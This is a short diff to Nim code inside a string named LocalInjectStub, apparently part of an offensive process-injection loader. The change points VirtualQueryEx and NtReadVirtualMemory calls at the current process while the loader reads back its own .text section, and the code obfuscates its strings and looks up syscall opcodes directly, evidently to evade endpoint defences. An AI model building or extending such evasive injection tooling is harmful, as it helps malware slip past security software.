@@ -137,7 +137,7 @@ let LocalInjectStub*  = """
                     when defined(restore):
                         var textStart: LPVOID = cast[LPVOID](module) + 0x1000 # .text section always starts at this offset to the base address
                         var mbi: MEMORY_BASIC_INFORMATION
-                        var sectionSize: SIZE_T = VirtualQueryEx(tProcess, textStart, addr mbi, sizeof(mbi))
+                        var sectionSize: SIZE_T = VirtualQueryEx(-1, textStart, addr mbi, sizeof(mbi))
                         when defined(verbose):
                             echo obf("[*] VirtualQueryEx result: "), sectionSize
                             echo obf("[*] Section size: "), mbi.RegionSize
@@ -152,7 +152,7 @@ let LocalInjectStub*  = """
                                 when defined(verbose):
                                     echo obf("[-] Failed to find opcode for NtReadVirtualMemory")
 
-                        status = NtReadVirtualMemory(tProcess, textStart, unsafeAddr originalRXSection[0], mbi.RegionSize, addr numberOfBytesRead)
+                        status = NtReadVirtualMemory(-1, textStart, unsafeAddr originalRXSection[0], mbi.RegionSize, addr numberOfBytesRead)
                         
                         when defined(verbose):
                             if (status == 0):
